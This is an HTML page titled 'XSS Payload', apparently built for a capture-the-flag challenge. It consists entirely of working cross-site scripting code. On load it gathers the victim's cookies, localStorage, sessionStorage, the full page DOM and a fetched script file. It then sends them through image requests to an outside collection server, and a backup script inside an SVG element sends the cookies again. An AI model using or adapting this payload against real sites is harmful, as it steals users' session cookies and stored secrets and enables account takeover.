<!DOCTYPE html>
<html>
<head>
    <title>XSS Payload</title>
</head>
<body>
    <script>
        // Configuration
        const EXFILTRATION_SERVER = "http://proxy/"; // URL pattern accepted by the bot
        
        // Function to exfiltrate data
        function exfiltrateData(data) {
            // Create an image element to send the data
            const img = new Image();
            img.src = `${EXFILTRATION_SERVER}?data=${encodeURIComponent(JSON.stringify(data))}`;
            document.body.appendChild(img);
        }
        
        // Collect data to exfiltrate
        function collectData() {
            const data = {
                url: location.href,
                cookies: document.cookie,
                localStorage: {},
                sessionStorage: {},
                dom: document.documentElement.innerHTML
            };
            
            // Collect localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }
            
            // Collect sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }
            
            return data;
        }
        
        // Main execution
        function main() {
            try {
                // Try to find flag in various places
                const data = collectData();
                
                // Look for flag pattern in DOM
                const flagRegex = /flag\{[^}]*\}/i;
                const domContent = document.documentElement.innerHTML;
                const flagMatch = domContent.match(flagRegex);
                
                if (flagMatch) {
                    data.flag = flagMatch[0];
                }
                
                // Exfiltrate the collected data
                exfiltrateData(data);
                
                // Also try to access any loaded scripts
                if (window.SCRIPTS) {
                    exfiltrateData({scripts: window.SCRIPTS});
                }
                
                // Try to fetch main.js directly
                fetch('./modules/main.js')
                    .then(response => response.text())
                    .then(text => {
                        exfiltrateData({mainJs: text});
                    })
                    .catch(error => {
                        exfiltrateData({fetchError: error.toString()});
                    });
            } catch (error) {
                // If anything goes wrong, exfiltrate the error
                exfiltrateData({error: error.toString()});
            }
        }
        
        // Execute main function
        main();
    </script>
    
    <!-- SVG with potential XSS vector -->
    <svg>
        <script>
            // Backup script in case the first one doesn't execute
            try {
                const data = {
                    url: location.href,
                    cookies: document.cookie
                };
                const img = new Image();
                img.src = `${EXFILTRATION_SERVER}?svg_data=${encodeURIComponent(JSON.stringify(data))}`;
                document.body.appendChild(img);
            } catch (e) {}
        </script>
    </svg>
</body>
</html>